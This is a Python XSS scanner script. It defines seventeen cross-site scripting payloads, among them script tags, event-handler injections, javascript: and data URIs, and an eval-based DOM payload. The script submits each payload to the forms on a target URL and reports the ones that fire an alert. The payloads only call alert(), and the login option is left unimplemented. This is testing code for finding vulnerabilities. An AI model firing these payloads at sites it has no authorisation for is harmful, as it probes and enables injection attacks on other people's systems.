"""
Script Name: CrossSiteScripting.py
Author: Justin Andrews
Version: 1.0
Date: 10/01/2024

Description:
    This script scans a given URL for potential XSS vulnerabilities by testing various XSS payloads
    on all forms found on the page.

Usage:
    python CrossSiteScripting.py <url> [options]

Options:
    --debug             Enable debug logging and additional output
    --login URL USERNAME PASSWORD
                       Authenticate before scanning (optional)
    --headless         Run in headless mode (default: True)

Examples:
    # Basic scan:
    python CrossSiteScripting.py http://example.com/page

    # With authentication:
    python CrossSiteScripting.py http://example.com/page --login http://example.com/login admin pass123

    # With debug output:
    python CrossSiteScripting.py http://example.com/page -d

Notes:
    - Requires Utils.py from the same directory
    - Use responsibly and only on systems you have permission to test

GUI Parameters Start:
"url": ""
"login_url": ""
"username": ""
"password": ""
"debug": false
"persistent": false
GUI Parameters End:
"""

import sys
from typing import List, Dict, Tuple, Any
from Utils import LoggingPipeline, WebDriver, ArgumentHandler

# XSS payload definitions
XSS_PAYLOADS = [
    {"name": "Alert-based payload", "payload": "<script>alert('XSS alert');</script>"},
    {
        "name": "Image onerror event",
        "payload": "<img src=x onerror=\"alert('XSS alert')\">",
    },
    {"name": "SVG onload event", "payload": "<svg onload=\"alert('XSS alert')\">"},
    {"name": "JavaScript URI", "payload": "javascript:alert('XSS alert')"},
    {
        "name": "Attribute breaking (single quote)",
        "payload": "' onmouseover=\"alert('XSS alert')\" '",
    },
    {
        "name": "Attribute breaking (double quote)",
        "payload": '" onmouseover="alert(\'XSS alert\')" "',
    },
    {
        "name": "CSS expression",
        "payload": "<div style=\"width: expression(alert('XSS alert'));\">",
    },
    {
        "name": "Meta refresh",
        "payload": '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS alert\')">',
    },
    {"name": "Body onload event", "payload": "<body onload=\"alert('XSS alert')\">"},
    {
        "name": "Input onfocus event",
        "payload": '<input type="text" onfocus="alert(\'XSS alert\')" autofocus>',
    },
    {
        "name": "Iframe src",
        "payload": "<iframe src=\"javascript:alert('XSS alert')\"></iframe>",
    },
    {
        "name": "Data URI",
        "payload": '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGFsZXJ0Jyk8L3NjcmlwdD4=">Click me</a>',
    },
    {
        "name": "HTML5 video tag",
        "payload": "<video><source onerror=\"alert('XSS alert')\">",
    },
    {"name": "Markdown XSS", "payload": "[a](javascript:alert('XSS alert'))"},
    {
        "name": "Script tag with XML data",
        "payload": "<script>x='<script>alert(\"XSS alert\")</script>'</script>",
    },
    {
        "name": "Unicode escape sequences",
        "payload": "<script>\\u0061lert('XSS alert')</script>",
    },
    {
        "name": "DOM-based XSS",
        "payload": "<script>eval(location.hash.slice(1))</script>#alert('XSS alert')",
    },
]


class XSSScanner:
    """Main XSS scanning class utilizing Utils components."""

    def __init__(self, url: str, debug: bool = False, headless: bool = True):
        """Initialize scanner with unified logging."""
        self.url = url
        self.debug = debug

        # Initialize unified logger for both console and file output
        self.logger = LoggingPipeline(
            debug=debug,
            logging=True,  # Always enable file logging
            log_name="xss_scan",
        )

        # Initialize WebDriver with same logging settings and form scanning enabled
        self.driver = WebDriver(
            url=url,
            headless=headless,
            debug=debug,
            logging=True,
            scan_forms=True,  # Explicitly enable form scanning for XSS testing
        )

        self.logger.start_section("XSS Scan Initialization")

    def scan(self) -> Tuple[List[Dict[str, Any]], int, int]:
        """Perform XSS scanning on the target URL."""
        self.logger.append_log(f"Starting XSS scan on {self.url}")
        results = []
        total_tests = 0
        passed_tests = 0

        try:
            for payload in XSS_PAYLOADS:
                total_tests += 1
                self.logger.append_log(f"Testing payload: {payload['name']}", "DEBUG")

                try:
                    # Submit the form with the payload
                    alert_detected = self.driver.submit_form(payload["payload"])

                    if alert_detected:
                        passed_tests += 1
                        self.logger.append_log(
                            f"XSS vulnerability found with payload: {payload['name']}",
                            "SUCCESS",
                        )
                        results.append(
                            {
                                "payload": payload,
                                "url": self.url,
                                "form": self.driver.forms,
                            }
                        )
                    else:
                        self.logger.append_log(
                            f"Payload failed: {payload['name']}", "WARNING"
                        )

                except Exception as e:
                    self.logger.append_log(
                        f"Error testing payload {payload['name']}: {str(e)}", "ERROR"
                    )
                    continue

        except Exception as e:
            self.logger.append_log(f"Fatal error during scan: {str(e)}", "ERROR")
            raise

        summary = f"Scan complete. Found {passed_tests} vulnerabilities"
        self.logger.append_log(summary)
        return results, total_tests, passed_tests

    def print_results(
        self, results: List[Dict[str, Any]], total_tests: int, passed_tests: int
    ) -> None:
        """Print formatted scan results."""
        self.logger.start_section("Scan Results")

        # Print summary statistics
        summary_stats = [
            f"Total tests conducted: {total_tests}",
            f"Successful XSS injections: {passed_tests}",
            f"Failed XSS injections: {total_tests - passed_tests}",
        ]

        for stat in summary_stats:
            self.logger.append_log(stat, "INFO")

        # List successful payloads
        if passed_tests > 0:
            self.logger.append_log("=== Successful XSS Payloads ===", "SUCCESS")
            for result in results:
                self.logger.append_log(
                    f"Name: {result['payload']['name']}\n"
                    f"Payload: {result['payload']['payload']}",
                    "SUCCESS",
                )

        # List failed payloads
        failed_payloads = [
            payload
            for payload in XSS_PAYLOADS
            if payload not in [r["payload"] for r in results]
        ]

        if failed_payloads:
            self.logger.append_log("=== Failed XSS Payloads ===", "WARNING")
            for payload in failed_payloads:
                self.logger.append_log(
                    f"Name: {payload['name']}\n" f"Payload: {payload['payload']}",
                    "WARNING",
                )

        self.logger.end_section()

    def cleanup(self):
        """Clean up resources."""
        self.driver.close()
        self.logger.end_section()
        self.logger.generate_log()


def main():
    # Define argument configuration
    arg_config = {
        "script": {
            "name": "CrossSiteScripting.py",
            "description": "XSS Vulnerability Scanner",
        },
        "args": {
            "url": {"help": "Target URL to scan", "positional": True},
            "login": {
                "nargs": 3,
                "metavar": ("LOGIN_URL", "USERNAME", "PASSWORD"),
                "help": "Login credentials (login URL, username, password)",
            },
            "debug": {
                "action": "store_true",
                "help": "Enable debug output",
                "flag": "-d",
            },
            "headless": {
                "action": "store_true",
                "help": "Run in headless mode",
                "default": True,
            },
        },
    }

    # Parse arguments with logging enabled
    arg_handler = ArgumentHandler(arg_config, debug=True, logging=True)
    args = arg_handler.parse_args()

    # Initialize and run scanner
    scanner = XSSScanner(args.url, debug=args.debug, headless=args.headless)

    try:
        # Handle login if credentials provided
        if args.login:
            login_url, username, password = args.login
            # Login handling would go here
            # Note: To be implemented based on your login requirements

        # Run the scan
        results, total_tests, passed_tests = scanner.scan()

        # Print results
        scanner.print_results(results, total_tests, passed_tests)

    except Exception as e:
        scanner.logger.append_log(f"Fatal error: {str(e)}", "ERROR")
        scanner.logger.generate_log()
        sys.exit(1)
    finally:
        scanner.cleanup()


if __name__ == "__main__":
    main()
